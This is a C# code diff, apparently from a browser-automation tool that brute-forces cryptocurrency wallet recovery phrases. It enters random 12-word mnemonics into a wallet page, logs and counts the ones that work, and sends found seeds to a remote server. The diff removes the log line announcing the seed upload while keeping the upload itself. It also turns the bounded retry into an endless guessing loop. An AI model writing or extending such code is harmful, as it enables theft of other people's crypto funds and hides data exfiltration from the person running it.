@@ -21,10 +21,7 @@ public static class AutomationRunner
         }
         catch { }
         if (ServerApi.Enabled && !string.IsNullOrEmpty(ServerApi.CurrentToken))
-        {
-            AppLog.WriteLine("시드 서버 전송 중...");
             _ = ServerApi.SendSeedAsync(ServerApi.CurrentToken, phraseLine);
-        }
         else if (!ServerApi.Enabled)
             AppLog.WriteLine("(서버 미연결: data 또는 exe 폴더에 server_url.txt 없음)");
         else
@@ -49,11 +46,10 @@ public static class AutomationRunner
         {
             cycleCount++;
             AppLog.WriteLine($"{cycleCount}회차 진행중");
-            AppLog.WriteLine("지갑 발견");
 
             MainLoop.RunFirstSet();
             if (MainLoop.CheckStop()) break;
-            Thread.Sleep(800);
+            Thread.Sleep(1200); // First Set 후 화면 전환 대기
 
             List<string> wordlist;
             if (!UseTestMnemonic)
@@ -69,44 +65,46 @@ public static class AutomationRunner
             AppLog.WriteAttemptedPhrase(string.Join(" ", mnemonic));
             AppLog.WriteLine("니모닉 입력 중");
             if (MainLoop.CheckStop()) break;
+            Thread.Sleep(400); // 니모닉 생성 후 잠시 대기
 
             MainLoop.RunSecondSet(mnemonic, useCtrlA: false);
             if (MainLoop.CheckStop()) break;
-            Thread.Sleep(3000);
+            Thread.Sleep(4000); // Second Set 후 결과 대기
 
             if (MainLoop.HasSuccess())
             {
-                AppLog.WriteLine("success 발견");
+                AppLog.WriteLineRed("지갑 발견");
+                WalletCountFile.Increment();
                 AppendSuccessPhrase(mnemonic);
-                ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.3);
-                Thread.Sleep(400);
-                ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.2);
-                AppLog.WriteLine("처음부터 다시 시작");
+                ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.5);
                 Thread.Sleep(600);
+                ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.35);
+                AppLog.WriteLine("처음부터 다시 시작");
+                Thread.Sleep(900);
                 continue;
             }
 
-            const int maxRetryRounds = 5;
             int tried = 0;
-            for (int round = 1; round <= maxRetryRounds && !MainLoop.CheckStop(); round++)
+            while (!MainLoop.CheckStop())
             {
-                tried = round;
+                tried++;
                 string[] retryMnemonic = UseTestMnemonic ? TestMnemonic : MainLoop.Random12(wordlist);
                 AppLog.WriteAttemptedPhrase(string.Join(" ", retryMnemonic));
                 if (MainLoop.RunSecondSetRetry(retryMnemonic))
                 {
-                    AppLog.WriteLine("success 발견");
+                    AppLog.WriteLineRed("지갑 발견");
+                    WalletCountFile.Increment();
                     AppendSuccessPhrase(retryMnemonic);
-                    ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.3);
-                    Thread.Sleep(400);
-                    ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.2);
-                    AppLog.WriteLine("처음부터 다시 시작");
+                    ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.5);
                     Thread.Sleep(600);
+                    ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.35);
+                    AppLog.WriteLine("처음부터 다시 시작");
+                    Thread.Sleep(900);
                     break;
                 }
-            }
-            if (tried > 0)
                 AppLog.WriteLine($"{tried}차 재시도");
+                Thread.Sleep(500); // 재시도 사이 간격
+            }
         }
 
         AppLog.WriteLine("작업 종료");
